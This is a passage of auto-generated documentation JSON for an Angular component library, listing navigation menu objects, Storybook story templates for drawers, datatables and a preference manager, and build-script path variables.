                "defaultValue": "{\r\n  'name': 'Web applications',\r\n  'groups': [\r\n    {\r\n      'name': 'Application 1',\r\n      'items': [\r\n        {\r\n          'id': 'a11',\r\n          'name': 'Application 1.1',\r\n          'svgIcon': false,\r\n          'icon': 'build',\r\n          'command': {\r\n            'type': 'navigate',\r\n            'arguments': [\r\n              'a11'\r\n            ]\r\n          }\r\n        },\r\n        {\r\n          'id': 'a12',\r\n          'name': 'Application 1.2',\r\n          'svgIcon': false,\r\n          'icon': 'attach_money',\r\n          'command': {\r\n            'type': 'navigate',\r\n            'arguments': [\r\n              'a12'\r\n            ]\r\n          }\r\n        }\r\n      ]\r\n    },\r\n    {\r\n      'name': 'Application 2',\r\n      'external': false,\r\n      'items': [\r\n        {\r\n          'id': 'a2',\r\n          'name': 'Application 2',\r\n          'svgIcon': false,\r\n          'icon': 'train',\r\n          'command': {\r\n            'type': 'navigate',\r\n            'arguments': [\r\n              'a2'\r\n            ]\r\n          }\r\n        }\r\n      ]\r\n    },\r\n    {\r\n      'name': 'Application 3',\r\n      'items': [\r\n        {\r\n          'id': 'a3',\r\n          'name': 'Application 3',\r\n          'svgIcon': false,\r\n          'icon': 'local_library',\r\n          'command': {\r\n            'type': 'externalLinkNewWindow',\r\n            'arguments': []\r\n          }\r\n        }\r\n      ]\r\n    }\r\n  ]\r\n}"
              },
              {
                "name": "subNavigation",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "object",
                "defaultValue": "{\r\n  'name': 'Application 2',\r\n  'groups': [\r\n    {\r\n      'name': null,\r\n      'items': [\r\n        {\r\n          'icon': 'date_range',\r\n          'name': 'Section 1',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '1'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'format_list_bulleted',\r\n          'name': 'Section 2',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '2'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'train',\r\n          'name': 'Section 3',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '3'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'access_time',\r\n          'name': 'Section 4',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '4'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'description',\r\n          'name': 'Section 5',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '5'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        }\r\n      ],\r\n      'hasDivider': false,\r\n      'svgIcon': false,\r\n      'icon': null\r\n    },\r\n    {\r\n      'name': null,\r\n      'items': [\r\n        {\r\n          'icon': 'train',\r\n          'name': 'SubSection 1',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '11'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'person',\r\n          'name': 'SubSection 2',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '12'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'business',\r\n          'name': 'SubSection 3',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              'SubSection 13'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        },\r\n        {\r\n          'icon': 'settings',\r\n          'name': 'SubSection 4',\r\n          'command': {\r\n            'type': 'internalLink',\r\n            'arguments': [\r\n              '4'\r\n            ]\r\n          },\r\n          'svgIcon': false,\r\n          'subItems': []\r\n        }\r\n      ],\r\n      'hasDivider': true,\r\n      'svgIcon': false,\r\n      'icon': null\r\n    }\r\n  ]\r\n}"
              }
            ],
            "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts": [
              {
                "name": "NAVIGATION_HOME_ICON",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "new InjectionToken<BreadcrumbConfig>('sto-home-icon')"
              }
            ],
          "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts": [
            {
              "name": "navigationItems",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  {\r\n    label: 'Direct route',\r\n    route: [ '/', 'home' ],\r\n    icon: 'home'\r\n  },\r\n  {\r\n    label: 'Internal route title',\r\n    children: [\r\n      {\r\n        route: [ '/', 'route1' ],\r\n        label: 'Internal child route',\r\n      },\r\n      {\r\n        route: [ '/', 'route2' ],\r\n        label: 'Internal child route 2',\r\n      },\r\n      {\r\n        route: [ '/', 'route3' ],\r\n        label: 'Internal child route 3',\r\n      },\r\n      {\r\n        route: [ '/', 'route4' ],\r\n        label: 'Internal child route 4',\r\n      },\r\n      {\r\n        route: [ '/', 'route5' ],\r\n        label: 'Internal child route 5',\r\n      },\r\n      {\r\n        route: [ '/', 'route6' ],\r\n        label: 'Internal child route 6',\r\n      },\r\n    ],\r\n    icon: 'dashboard',\r\n    title: 'Dashboard'\r\n  },\r\n  {\r\n    label: 'External',\r\n    children: [\r\n      {\r\n        link: 'https://example.com',\r\n        target: '_blank',\r\n        label: 'Example.com'\r\n      }\r\n    ],\r\n    icon: 'open_in_new',\r\n  },\r\n  {\r\n    link: '#',\r\n    label: 'Disabled Route',\r\n    children: [],\r\n    icon: 'do_disturb',\r\n    disabled: true\r\n  },\r\n]"
            },
            {
              "name": "NormalUse",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "(args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n}"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<NavDrawerComponent>",
              "defaultValue": "(args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n  };\r\n}"
            },
            {
              "name": "WithAppHeader",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "(args: NavDrawerComponent) => {\r\n  return {\r\n    component: NavDrawerComponent,\r\n    props: args,\r\n    template: `\r\n    <sto-app-header></sto-app-header>\r\n    <sto-nav-drawer [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\r\n    `\r\n  };\r\n}"
            }
          ],
          "libs/datatable/src/lib/datatable.stories.ts": [
            {
              "name": "NormalUse",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/datatable.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<StoDatatableComponent<Record<string, >>>",
              "defaultValue": "(args: StoDatatableComponent<Record<string, unknown>>) => {\r\n  return {\r\n    component: StoDatatableComponent,\r\n    props: {\r\n      ...args, columns: args.scrollbarH ? [ ...columns, ...columns, ...columns ] : columns,\r\n      rows: rows,\r\n      headerContextMenu: action('Header context menu'),\r\n      rowContextMenu: action('Row context menu'),\r\n      rowActivate: action('Keyboard-activation on row'),\r\n      select: action('Row selected'),\r\n      resized: action('Resize')\r\n    },\r\n  };\r\n}"
            }
          ],
          "libs/datatable/src/lib/swimlane-table.stories.ts": [
            {
              "name": "NormalUse",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/swimlane-table.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<Record<string, >>",
              "defaultValue": "(args: Record<string, unknown>) => {\r\n  return {\r\n    props: args,\r\n    template: `<mat-card>\r\n<mat-card-title><h2>This replaces StoComplexDatatable and is only here for CSS</h2></mat-card-title>\r\n<ngx-datatable [loadingIndicator]=\"loading\"\r\n[footerHeight]=\"40\"\r\n[selectionType]=\"'single'\"\r\n[scrollbarV]=\"true\"\r\n[scrollbarH]=\"horizontalScroll\"\r\n[style.height.px]=\"height\"\r\n[rowHeight]=\"rowHeight\"\r\n[headerHeight]=\"headerHeight\"\r\n[class.sto-datatable]=\"withCss\"\r\n[rows]=\"rows\"\r\n[columns]=\"columns\"></ngx-datatable>\r\n</mat-card>`\r\n  };\r\n}"
            }
          ],
          "libs/error-handler/src/lib/error-handler.stories.ts": [
            {
              "name": "NormalUse",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/error-handler/src/lib/error-handler.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/error-handler/src/lib/error-handler.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<Record<string, >>",
              "defaultValue": "(args: Record<string, unknown> ) => {\r\n  return {\r\n    props: args,\r\n    template: `<next-wrapper></next-wrapper>`,\r\n  };\r\n}"
            }
          ],
          "libs/drawer/src/lib/sto-navigation/navigation.stories.ts": [
            {
              "name": "NormalUse",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<>",
              "defaultValue": "(args: StoDrawerComponent) => {\r\n  const actions = {\r\n    handleCommand: action('Link pressed'),\r\n    topsNav: action('Open tops landing'),\r\n    toggle: action('Switch side'),\r\n    closeMenu: action('Close menu'),\r\n  };\r\n  return {\r\n    component: StoDrawerComponent,\r\n    props: { ...args, ...actions, navigation, subNavigation },\r\n    template: `<div>\r\n  <sto-drawer [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\r\n<sto-drawer-header>\r\n<div class=\"sto-drawer__header__infix\">\r\n        <button *ngIf=\"activePane === 'right'; else topIcon\"\r\n                type=\"button\"\r\n                mat-icon-button\r\n                (click)=\"toggle(); activePane = 'left'\">\r\n          <mat-icon>arrow_back</mat-icon>\r\n        </button>\r\n        <ng-template #topIcon>\r\n          <button mat-icon-button\r\n          type=\"button\"\r\n          (click)=\"topsNav()\">\r\n            <mat-icon [class.sto-main-icon--test-environment]=\"testEnvironment\">settings</mat-icon>\r\n          </button>\r\n        </ng-template>\r\n      </div>\r\n<div class=\"sto-drawer__header__title\">\r\n        <ng-container *ngIf=\"activePane === 'right'; else leftName;\">\r\n          <span *ngIf=\"activePane === 'right'\">\r\n           {{rightMenu.name}}\r\n         </span>\r\n        </ng-container>\r\n        <ng-template #leftName>\r\n         <span *ngIf=\"activePane === 'left'\">\r\n           {{leftMenu.name}}\r\n         </span>\r\n        </ng-template>\r\n      </div>\r\n      <div class=\"sto-drawer__header__suffix\">\r\n        <button type=\"button\"\r\n                mat-icon-button\r\n                (click)=\"closeMenu(); open = false\">\r\n          <mat-icon>close</mat-icon>\r\n        </button>\r\n      </div>\r\n</sto-drawer-header>\r\n<sto-slide-panel class=\"sto-slide-panel\"\r\n                     [activePane]=\"activePane\">\r\n                     {{activePane}}\r\n<sto-navigation-menu [menu]=\"subNavigation\"\r\n*ngIf=\"activePane === 'right'\"\r\n                         (onCommand)=\"handleCommand('internal', $event.command)\"\r\n                         rightPane></sto-navigation-menu>\r\n<sto-navigation-menu [menu]=\"navigation\"\r\n*ngIf=\"activePane === 'left'\"\r\n                         (onCommand)=\"activePane = 'right'; handleCommand('root', $event.command)\"\r\n                         leftPane></sto-navigation-menu>\r\n                         </sto-slide-panel>\r\n</sto-drawer>\r\n\r\n\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n</div>`\r\n  };\r\n}"
            }
          ],
          "libs/drawer/src/lib/sto-drawer/drawer.stories.ts": [
            {
              "name": "NormalUse",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<StoDrawerComponent>",
              "defaultValue": "(args: StoDrawerComponent) => {\r\n  return {\r\n    component: StoDrawerComponent,\r\n    props: args,\r\n    template: `\r\n  <div>\r\n  <sto-drawer [position]=\"position\" [open]=\"open\" [animation]=\"animation\" [backdrop]=\"backdrop\">\r\n<sto-drawer-header>\r\n<div class=\"sto-drawer__header__title\">\r\n<h2>Title</h2>\r\n      </div>\r\n</sto-drawer-header>\r\n\r\n<mat-card class=\"sto-card\"><p>Content in drawer</p></mat-card>\r\n\r\n<sto-drawer-footer>\r\n<button mat-button color=\"primary\">Save</button>\r\n</sto-drawer-footer>\r\n</sto-drawer>\r\n\r\n\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n<mat-card class=\"sto-card sto-form\">\r\n<mat-card-title class=\"sto-card__title\">Content title</mat-card-title>\r\n</mat-card>\r\n</div>\r\n`,\r\n\r\n  };\r\n}"
            }
          ],
          "tools/scripts/build-scss.ts": [
            {
              "name": "out",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/build-scss.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
            },
            {
              "name": "promises",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/build-scss.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  processScss('./libs/core/src/ngx-stoui.scss', path.join(out, 'ngx-stoui.css')),\r\n  processScss('./libs/core/src/style/datatable/ngx-datatable.scss', path.join(out, 'ngx-datatable.css')),\r\n]"
            },
            {
              "name": "root",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/build-scss.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "path.join(__dirname, '../../')"
            },
            {
              "name": "writeFile",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/build-scss.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "promisify(writeFileCb)"
            }
          ],
          "tools/scripts/copy-assets.ts": [
            {
              "name": "out",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/copy-assets.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
            },
            {
              "name": "root",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/copy-assets.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "path.join(__dirname, '../../')"
            },
            {
              "name": "scss",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/copy-assets.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "path.join(src, 'style/**/*')"
            },
            {
              "name": "src",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "tools/scripts/copy-assets.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "path.join(root, 'libs', 'core', 'src')"
            }
          ],
          "libs/form/src/lib/number-input/number-input.pipe.ts": [
            {
              "name": "PADDING",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "string",
              "defaultValue": "'000000000'"
            }
          ],
          "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts": [
            {
              "name": "preferenceKey",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "string",
              "defaultValue": "'TOPS_IM:UserPreferences'"
            }
          ],
            "libs/common/src/lib/preference-manager/preference-manager.stories.ts": [
              {
                "name": "preferences",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Preference[]",
                "defaultValue": "[\r\n  { name: 'A filter', id: 'uuid', identifierKey: 'reports_filter', user: 'Bobby B', payload: {} },\r\n  { name: 'Another filter', id: 'uuid-2', identifierKey: 'reports_filter', user: 'Bobby B', default: true, payload: {} },\r\n]"
              },
              {
                "name": "Usage",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/preference-manager/preference-manager.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<PreferenceManagerComponent>",
                "defaultValue": "(args: PreferenceManagerComponent) => {\r\n  return {\r\n    props: {\r\n      ...args,\r\n      filterForm: new FormControl(),\r\n      onSelect: function (id: string) {\r\n        this.activePreferenceId = id;\r\n        this.filterForm.reset();\r\n        action('Select preference')(id);\r\n      },\r\n      onSetDefault: function (pref: Preference) {\r\n        const preferences = this.preferences as Preference[];\r\n        const index = preferences.findIndex(p => p.id === pref.id);\r\n        const prefs: Preference[] = [ ...preferences ].map(p => ( { ...p, default: false } ));\r\n        prefs[ index ] = pref;\r\n        this.loadingIndicator = true;\r\n        action('Set default preference')(pref.name);\r\n        setTimeout(() => {\r\n          this.preferences = prefs;\r\n          this.loadingIndicator = false;\r\n        }, 300);\r\n      },\r\n      onEdit: function (pref: Preference) {\r\n        const preferences = this.preferences as Preference[];\r\n        const index = preferences.findIndex(p => p.id === pref.id);\r\n        const prefs = [ ...preferences ];\r\n        prefs[ index ] = pref;\r\n        // Set preference in payload\r\n        this.loadingIndicator = true;\r\n        this.filterForm.markAsPristine();\r\n        action('Edit preference')(`${pref.name} with id ${pref.id}`);\r\n\r\n        setTimeout(() => {\r\n          this.preferences = prefs;\r\n          this.loadingIndicator = false;\r\n        }, 300);\r\n      },\r\n      onDeletePreference: function (id: string) {\r\n        action('Delete preference')(id);\r\n        const preferences = this.prerences as Preference[];\r\n        const index = preferences.findIndex(p => p.id === id);\r\n        const prefs = [ ...preferences ];\r\n        prefs.splice(index, 1);\r\n        this.preferences = prefs;\r\n      },\r\n      onAdd: function (preference: Preference) {\r\n        action('Create preference')(preference);\r\n        preference.id = Date.now().toString(10);\r\n        this.preferences = [ ...this.preferences, preference ];\r\n      }\r\n    },\r\n    component: PreferenceManagerComponent,\r\n    template: `\r\n<sto-filter-panel [expandable]=\"true\" [expanded]=\"true\">\r\n  <sto-filter-title><sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\r\n                                            (editPreference)=\"onEdit($event)\"\r\n                                            (addNewPreference)=\"onAdd($event)\"\r\n                                            [dirty]=\"filterForm.dirty\"\r\n                                            (deletePreference)=\"onDeletePreference($event)\"\r\n                                            (selectPreference)=\"onSelect($event)\"\r\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\r\n                                            [activePreferenceId]=\"activePreferenceId\"\r\n                                            [preferences]=\"preferences\"></sto-preference-manager></sto-filter-title>\r\n  <input [formControl]=\"filterForm\" placeholder=\"Write stuff here to trigger modified\">\r\n  <button (click)=\"filterForm.reset(); filterForm.markAsPristine()\">And click to clear</button>\r\n</sto-filter-panel>\r\n\r\n<sto-preference-manager [loadingIndicator]=\"loadingIndicator\"\r\n                                            (editPreference)=\"onEdit($event)\"\r\n                                            (addNewPreference)=\"onAdd($event)\"\r\n                                            [dirty]=\"filterForm.dirty\"\r\n                                            (deletePreference)=\"onDeletePreference($event)\"\r\n                                            (selectPreference)=\"onSelect($event)\"\r\n                                            (setDefaultPreference)=\"onSetDefault($event)\"\r\n                                            [activePreferenceId]=\"activePreferenceId\"\r\n                                            [preferences]=\"preferences\"></sto-preference-manager>\r\n`\r\n  };\r\n}"
              }
            ],
            "apps/oilmod-web/src/app/app.component.stories.ts": [
              {
                "name": "primary",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "apps/oilmod-web/src/app/app.component.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "() => ({\r\n  moduleMetadata: {\r\n    imports: []\r\n  },\r\n  props: {\r\n  }\r\n})"
              }
            ],
            "libs/core/src/lib/styles.stories.ts": [
              {
                "name": "StoCard",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<literal type>",
                "defaultValue": "(args) => ( {\r\n  props: { ...args },\r\n  template: `<mat-card [class.sto-card]=\"withStyles\">\r\n<mat-card-title [class.sto-card__title]=\"withStyles\">Card Title</mat-card-title>\r\n<mat-card-subtitle [class.sto-card__subtitle]=\"withStyles\">Card Subtitle</mat-card-subtitle>\r\n<mat-card-content [class.sto-card__content]=\"withStyles\">Card Content In Here</mat-card-content>\r\n</mat-card>`\r\n} )"
              },
              {
                "name": "StoDialog",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<Record<string, >>",
                "defaultValue": "(args) => ( {\r\n  props: { ...args },\r\n  template: `<app-dialog-demo [separatorLines]=\"separatorLines\"></app-dialog-demo>`,\r\n} )"
              },
              {
                "name": "StoTheme",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/styles.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<Record<string, >>",
                "defaultValue": "args => ( {\r\n  props: { ...args, colors: [ 'primary', 'accent', 'warn', 'warning', 'success', 'danger' ] },\r\n  styles: [\r\n    `\r\n    .container { display: flex; }\r\n    .container > div {\r\n     flex: 0 1 auto;\r\n     padding-left: 16px;\r\n     }\r\n    `\r\n  ],\r\n  template: `\r\n  <mat-tab-group>\r\n  <mat-tab label=\"Buttons\">\r\n    <mat-card class=\"sto-card\">\r\n    <div *ngFor=\"let color of colors\">\r\n      <mat-card-subtitle class=\"sto-card__subtitle\">\r\n    <h2>{{ color }}</h2>\r\n</mat-card-subtitle>\r\n    <button mat-button [color]=\"color\">Mat Button</button>\r\n    <button mat-stroked-button [color]=\"color\">Mat stroked Button</button>\r\n    <button mat-flat-button [color]=\"color\">Mat flat Button</button>\r\n    <button mat-raised-button [color]=\"color\">Mat raised Button</button>\r\n    <button mat-icon-button [color]=\"color\"><mat-icon>home</mat-icon></button>\r\n</div>\r\n</mat-card>\r\n  </mat-tab>\r\n  <mat-tab label=\"Cards\">\r\n  <mat-card *ngFor=\"let c of colors\" [ngClass]=\"'mat-' + c\">\r\n  <mat-card-title>{{ c }}</mat-card-title>\r\n</mat-card>\r\n</mat-tab>\r\n<mat-tab label=\"Text\">\r\n<mat-card class=\"sto-card\">\r\n    <div class=\"container\">\r\n    <div>\r\n    <p *ngFor=\"let color of colors\" [ngClass]=\"'mat-' + color\">&lt;p&gt; {{ color }}</p>\r\n</div>\r\n<div>\r\n    <span *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\r\n    &lt;span&gt; {{ color }}\r\n</span>\r\n</div>\r\n<div>\r\n    <h2 *ngFor=\"let color of colors\" style=\"display: block\" [ngClass]=\"'mat-' + color\">\r\n    &lt;h[1|2|3|4|5]&gt; {{ color }}\r\n</h2>\r\n</div>\r\n</div>\r\n</mat-card>\r\n</mat-tab>\r\n</mat-tab-group>\r\n  `,\r\n} )"
              }
            ],
            "libs/core/src/lib/sto-directives/directives.stories.ts": [
              {
                "name": "StoContextMenu",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "() => ( {\r\n  props: {\r\n    closed: action('Menu closed'),\r\n    log: action('Active menu info')\r\n  },\r\n  template: `<mat-card>\r\n<mat-card-title>Context menu</mat-card-title>\r\n  <button\r\n#overlay=\"stoMenuOverlay\"\r\n[matMenuTriggerRestoreFocus]=\"false\"\r\n(menuClosed)=\"closed()\"\r\nmat-button stoMenuOverlay #trigger=\"matMenuTrigger\" [matMenuTriggerFor]=\"menu\">Menu trigger button</button>\r\n<br>\r\n<br>\r\n<p>\r\n  Active Menu Index {{ activeMenuInfo }}\r\n</p>\r\n<br>\r\n<br>\r\n<div style=\"width: 500px; display: flex; justify-content: space-between\">\r\n<span [menuContext]=\"{index: 0}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 0</span>\r\n<span [menuContext]=\"{index: 1}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 1</span>\r\n<span [menuContext]=\"{index: 2}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 2</span>\r\n<span [menuContext]=\"{index: 3}\" [overlayDirective]=\"overlay\" [menuTrigger]=\"trigger\" stoContextMenu>Context 3</span>\r\n</div>\r\n\r\n<mat-menu [backdropClass]=\"'backdrop-remove'\" [hasBackdrop]=\"false\" #menu=\"matMenu\">\r\n  <ng-template matMenuContent let-index=\"index\">\r\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log('index', index, $event)\">Index {{ index }}</button>\r\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(1, $event)\">Item 1</button>\r\n    <button mat-menu-item (click)=\"activeMenuInfo = index; log(2, $event)\">Item 2</button>\r\n  </ng-template>\r\n</mat-menu>\r\n</mat-card>`\r\n} )"
              },
              {
                "name": "StoGrid",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/directives.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "defaultValue": "(args: Record<string, unknown>) => ( {\r\n  props: { ...args },\r\n  template: `<mat-card class=\"sto-card\">\r\n<div style=\"background: white;\" stoGrid [maxWidth]=\"1000\" [breakpoints]=\"breakpoints\">\r\n<div stoGridColumn style=\"background: lightblue;\">1 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">2 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">3 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">4 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">5 (col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">6 (col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">7 (double col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">8 (double col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" stoGridSpacer>9 (double spacer, hidden on 2-col)</div>\r\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">10 (double col)</div>\r\n<div stoGridColumn style=\"background: lightblue;\">11 (col)</div>\r\n<div stoGridColumn stoGridSpacer>12 (spacer, hidden on 1-col)</div>\r\n<div stoGridColumn style=\"background: transparent;\" class=\"sto-form\"></div>\r\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\">13 (col spacer, hidden on 1-col grid)</div>\r\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\" [stoGridColumnDouble]=\"true\" >14 (double spacer, hidden on 2-col)</div>\r\n</div>\r\n</mat-card>`\r\n} )"
              }
            ],
          "libs/form/src/lib/number-input/number-input.stories.ts": [
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/form/src/lib/number-input/number-input.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<>",
